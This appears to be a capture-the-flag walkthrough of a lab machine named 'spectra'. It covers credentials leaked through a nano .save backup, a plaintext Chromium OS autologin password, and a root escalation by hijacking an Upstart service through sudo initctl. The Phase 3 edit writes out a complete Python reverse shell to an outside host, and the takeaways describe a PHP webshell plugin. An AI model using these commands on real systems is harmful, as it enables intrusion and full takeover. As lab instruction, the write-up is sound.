Nano Backup File Leaks DB Credentials

The /testing/ directory is browsable and contains wp-config.php.save — a nano editor backup file. View source (Ctrl+U) to see the PHP content instead of executing it:

define( 'DB_NAME', 'dev' );
define( 'DB_USER', 'devtest' );
define( 'DB_PASSWORD', 'devteam01' );
define( 'DB_HOST', 'localhost' );
.save files are a common leak vector When nano crashes or is killed, it creates a .save backup of the file being edited. If directory listing is enabled, these backups are publicly accessible. Unlike .php files, .php.save won't be executed by the web server — the raw PHP source is visible.

Phase 2

Lateral Movement — Chrome OS Autologin Password

nginx@spectra ~ $ cat /etc/lsb-release
CHROMEOS_RELEASE_NAME=Chromium OS
CHROMEOS_RELEASE_VERSION=87.3.41
This is Chromium OS, not standard Linux Chromium OS (the open-source base for Chrome OS / Chromebooks) has a unique autologin mechanism. On boot, a script reads a plaintext password from a file and uses it to automatically log in a user — the password is stored in /etc/autologin/passwd. 
# The autologin config reveals where the password is stored
nginx@spectra ~ $ cat /opt/autologin.conf.orig
for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
done

nginx@spectra ~ $ cat /etc/autologin/passwd

Phase 3

Privilege Escalation — sudo initctl Service Hijack

katie@spectra ~ $ sudo -l
(ALL) SETENV: NOPASSWD: /sbin/initctl
initctl + writable service config = root initctl is the Upstart init system's control tool (Chrome OS uses Upstart, not systemd). It starts/stops services defined in /etc/init/*.conf. If katie can write to any .conf file AND run sudo initctl, she can inject commands into the service definition and start it as root.

Find Writable Service Configs

katie@spectra ~ $ find /etc/init -type f -group developers 2>/dev/null
/etc/init/test.conf    -rw-rw---- root:developers

Hijack the Service

# Replace the exec line with a reverse shell
katie@spectra ~ $ vi /etc/init/test.conf
# Change exec line to:
exec python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.15.65",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Stop (if running) and start the service
katie@spectra ~ $ sudo initctl stop test 2>/dev/null
katie@spectra ~ $ sudo initctl start test
test start/running, process 10650
Race condition — be fast A background cron job periodically restores test.conf to its original content. Edit and start the service immediately — if your changes get overwritten, just do it again.

Appendix

Key Takeaways

Nano .save backups expose source code.

Directory listing + wp-config.php.save = plaintext database credentials. Always scan for .save, .bak, .swp, ~ backup files.

WordPress plugin upload is the standard WP foothold.

A valid plugin header + system($_REQUEST["cmd"]) = instant webshell. Works on any WordPress where you have admin access.

Chromium OS stores autologin passwords in plaintext.

/etc/autologin/passwd is a Chrome OS-specific file. When you land on an unusual OS, research its unique features — they often have security implications.

Upstart service configs writable by non-root = privilege escalation.

initctl with sudo starts services as root. If you can write the .conf file, the exec line becomes root code execution.

Different OS = different post-exploitation playbook.

Chromium OS uses Upstart (not systemd), has autologin mechanisms, and stores things in non-standard paths. cat /etc/lsb-release or uname -a should be your first command after any shell.
